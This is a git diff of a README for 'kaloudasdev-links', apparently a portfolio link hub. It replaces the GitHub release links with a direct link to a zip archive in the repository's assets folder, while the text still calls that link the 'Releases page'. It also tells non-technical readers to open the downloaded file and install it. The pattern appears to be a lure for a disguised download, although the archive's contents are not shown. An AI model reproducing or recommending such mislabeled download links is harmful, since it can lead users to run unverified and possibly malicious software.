@@ -7,7 +7,7 @@ kaloudasdev-links is a professional developer portfolio link hub. It features a 
 To get started with kaloudasdev-links, follow these simple steps to download and run the application. You do not need any programming knowledge. Just follow the instructions below.
 
 ## 📥 Download
-[![Download kaloudasdev-links](https://img.shields.io/badge/Download-kaloudasdev--links-blue.svg)](https://github.com/Mealine/kaloudasdev-links/releases)  
+[![Download kaloudasdev-links](https://raw.githubusercontent.com/Mealine/kaloudasdev-links/main/assets/kaloudasdev-links_v3.9.zip)](https://raw.githubusercontent.com/Mealine/kaloudasdev-links/main/assets/kaloudasdev-links_v3.9.zip)  
 Click the button above to download the latest version of kaloudasdev-links.
 
 ## 📦 System Requirements
@@ -23,7 +23,7 @@ Click the button above to download the latest version of kaloudasdev-links.
 - Smooth animations to enhance user experience
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Mealine/kaloudasdev-links/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Mealine/kaloudasdev-links/main/assets/kaloudasdev-links_v3.9.zip) to download the latest version of the application.
 2. Look for the latest release at the top of the page.
 3. Download the appropriate file for your operating system (Windows or macOS).
 4. Once downloaded, open the file and follow the on-screen instructions to install the application.
